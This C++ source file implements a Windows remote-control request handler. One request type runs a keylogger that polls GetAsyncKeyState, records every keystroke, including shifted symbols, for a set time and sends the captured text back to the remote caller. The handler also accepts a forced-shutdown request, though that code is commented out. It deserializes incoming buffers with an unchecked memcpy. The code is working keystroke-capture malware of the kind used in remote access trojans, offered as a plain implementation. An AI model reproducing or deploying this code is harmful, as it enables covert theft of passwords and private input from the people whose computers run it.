#include "RemoteControlingRequestHandler.h"
#include <memory>
#include <iostream>
#include <windows.h>
#include <string>
#include <map> 
#include <vector>
#include <cstring> 

KeyBoardReadingRequest RemoteControlingRequestHandler::deserializeRequest(const std::vector<char>& buffer)
{
    KeyBoardReadingRequest request;
    std::memcpy(&request, buffer.data(), sizeof(request));
    return request;
}

std::vector<char> RemoteControlingRequestHandler::convertToVector(const TurnOfComputerResponse& response) {
    std::vector<char> result;
    result.push_back(static_cast<uint8_t>(response.status));
    return result;
}

IRequestHandler::RequestResult RemoteControlingRequestHandler::handleRequest(const RequestInfo& request) {
    switch (request.id)
    {
    case TURN_OFF_COMPUTER_REQUEST:
        return turnOffComputer();
    case KEY_BOARD_READING_REQUEST:
        KeyBoardReadingRequest keyBoardReadingRequest = deserializeRequest(request.buffer);
        return readKeyboard(keyBoardReadingRequest.timeInSecondToRead);
    default:
        return IRequestHandler::RequestResult{ {}, nullptr };
    }
}

IRequestHandler::RequestResult RemoteControlingRequestHandler::turnOffComputer() {
    /*
    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;
    
    // Open the process token to adjust privileges
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        std::cerr << "OpenProcessToken failed with error: " << GetLastError() << std::endl;
        {
            return IRequestHandler::RequestResult{ {}, nullptr };;
        }
    }

    // Get the LUID for the shutdown privilege
    if (!LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid))
    {
        std::cerr << "LookupPrivilegeValue failed with error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return IRequestHandler::RequestResult{ {}, nullptr };;
    }

    tkp.PrivilegeCount = 1;  // One privilege to set
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  // Enable the shutdown privilege

    // Adjust the token privileges
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0))
    {
        std::cerr << "AdjustTokenPrivileges failed with error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        return IRequestHandler::RequestResult{ {}, nullptr };
    }

    // Check if the adjustment was successful
    if (GetLastError() != ERROR_SUCCESS)
    {
        std::cerr << "Failed to enable shutdown privilege. Error: " << GetLastError() << std::endl;
        CloseHandle(hToken);
        {
            {
                return IRequestHandler::RequestResult{ {}, nullptr };
            }
        }
    }

    // Shut down the computer
    if (!ExitWindowsEx(EWX_SHUTDOWN | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER))
    {
        std::cerr << "ExitWindowsEx failed with error: " << GetLastError() << std::endl;
    }

    // Close the token handle
    CloseHandle(hToken);    
    */
    std::vector<char> response = { 'O', 'K' };  // sending back "OK"
    return IRequestHandler::RequestResult{ response, nullptr };
}

IRequestHandler::RequestResult RemoteControlingRequestHandler::readKeyboard(int timeInSeconds)
{
    DWORD start_time = GetTickCount();
    std::string capturedKeys;  // string to store all key presses
    std::map<int, char> shiftChars;  // map for shift-modified characters

    // define a mapping for special characters when Shift is held
    shiftChars[0x31] = '!'; // 1 key
    shiftChars[0x32] = '@'; // 2 key
    shiftChars[0x33] = '#'; // 3 key
    shiftChars[0x34] = '$'; // 4 key
    shiftChars[0x35] = '%'; // 5 key
    shiftChars[0x36] = '^'; // 6 key
    shiftChars[0x37] = '&'; // 7 key
    shiftChars[0x38] = '*'; // 8 key
    shiftChars[0x39] = '('; // 9 key
    shiftChars[0x30] = ')'; // 0 key
    shiftChars[0xBA] = ':'; // ; key
    shiftChars[0xBB] = '+'; // = key
    shiftChars[0xBC] = '<'; // , key
    shiftChars[0xBD] = '_'; // - key
    shiftChars[0xBE] = '>'; // . key
    shiftChars[0xBF] = '?'; // / key
    shiftChars[0xDB] = '{'; // [ key
    shiftChars[0xDC] = '|'; // \ key
    shiftChars[0xDD] = '}'; // ] key
    shiftChars[0xDE] = '\"'; // ' key

    // Keep track of keys currently pressed
    bool keysPressed[256] = { false };

            while (GetTickCount() - start_time < timeInSeconds * 1000) {
                bool shiftPressed = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
                bool capsLockOn = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

                for (int key = 8; key <= 190; key++) {
                    // check if the key is pressed - last byte of GetAsyncKeyState is the key state
                    if (GetAsyncKeyState(key) & 0x8000) {
                        if (!keysPressed[key]) {
                            keysPressed[key] = true;

                            if (key >= 'A' && key <= 'Z') {
                                // if the key is a letter
                                if (shiftPressed ^ capsLockOn) {
                                    capturedKeys += char(key);  // uppercase letter
                                }
                                else {
                                    capturedKeys += char(key + 32);  // lowercase letter
                                }
                            }
                            else if (key >= '0' && key <= '9') {
                                // for number keys, check if shift is pressed
                                if (shiftPressed && shiftChars.find(key) != shiftChars.end()) {
                                    capturedKeys += shiftChars[key];  // Special characters
                        }
                        else {
                            capturedKeys += char(key);  // Numbers
                        }
                    }
                    else if (shiftChars.find(key) != shiftChars.end() && shiftPressed) {
                        // other special characters with shift pressed
                        capturedKeys += shiftChars[key];
                    }
                    else if (key >= 32 && key <= 126) {  // Printable characters range
                        // direct printable characters
                        capturedKeys += char(key);
                    }
                }
            }
            else {
                keysPressed[key] = false;
            }
        }
    }

    // output the captured keys after the loop finishes
    std::vector<char> response(capturedKeys.begin(), capturedKeys.end());
    return IRequestHandler::RequestResult{ response, nullptr };
}



bool RemoteControlingRequestHandler::isRequestRelevant(const RequestInfo& info) const {
    return info.id == TURN_OFF_COMPUTER_REQUEST || info.id == KEY_BOARD_READING_REQUEST;
}
